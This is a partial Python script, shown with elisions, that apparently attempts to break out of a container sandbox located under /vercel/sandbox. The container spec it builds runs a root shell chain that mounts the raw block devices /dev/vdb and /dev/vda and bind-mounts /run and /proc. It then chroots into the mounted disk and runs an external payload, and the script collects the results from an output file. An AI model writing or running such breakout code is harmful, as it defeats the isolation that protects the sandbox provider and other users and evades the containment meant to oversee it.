...
PAYLOAD = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vda121_probe_guest.py'), 'rb').read()
...
def make_spec(cid, with_pid_ns):
    ...
    spec = {
        ...
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": ["/bin/sh", "-c",
                     "echo V99_START $$ > /tmp/v121c.out 2>&1;"
                     "mkdir -p /mnt/g/run /mnt/g/proc /mnt/g/mnt/h;"
                     "timeout 8 mount /dev/vdb /mnt/g 2>&1;"
                     "M_RC=$?;"
                     "echo VDB_RC=$M_RC >> /tmp/v121c.out;"
                     "echo VDB_RC=$M_RC >> /mnt/g/vercel/sandbox/v121c.out 2>&1;"
                     "if [ $M_RC -eq 0 ]; then"
                     " mount --bind /run /mnt/g/run 2>&1; echo BIND_RUN=$? >> /mnt/g/vercel/sandbox/v121c.out;"
                     " mount --bind /proc /mnt/g/proc 2>&1; echo BIND_PROC=$? >> /mnt/g/vercel/sandbox/v121c.out;"
                     " timeout 8 mount /dev/vda /mnt/g/mnt/h 2>&1; echo VDA_RC=$? >> /mnt/g/vercel/sandbox/v121c.out;"
                     " /sbin/chroot /mnt/g /usr/bin/python3 /vercel/sandbox/v121_payload.py "
                     ">> /mnt/g/vercel/sandbox/v121c.out 2>&1;"
                     " echo CHROOT_RC=$? >> /mnt/g/vercel/sandbox/v121c.out;"
                     "fi;"
                     "echo V99_END >> /mnt/g/vercel/sandbox/v121c.out 2>&1;"
                     "sleep 99999"],
...
def run_container(CSP, sk, with_pid_ns):
    CID = 'v121a' if with_pid_ns else 'v121b'
...
def main():
    ...
    pf = '/vercel/sandbox/v121_payload.py'
    try:
    ...
    while t_wait < 300 and not done:
        ...
        try:
            ...
            if cur != seen:
                ...
                seen = cur
                log('--- COW v121c.out @%ds +%d ---\n%s' % (t_wait, len(new), new))
            if 'V121C_DONE' in cur or 'V99_END' in cur:
                done = True
        except Exception as e:
    ...
    try:
        full = open('/vercel/sandbox/v121c.out', errors='replace').read()
        if len(full) > len(seen):
            log('--- COW v121c.out FULL +%d ---\n%s' % (len(full) - len(seen), full[len(seen):]))
    except Exception as e:
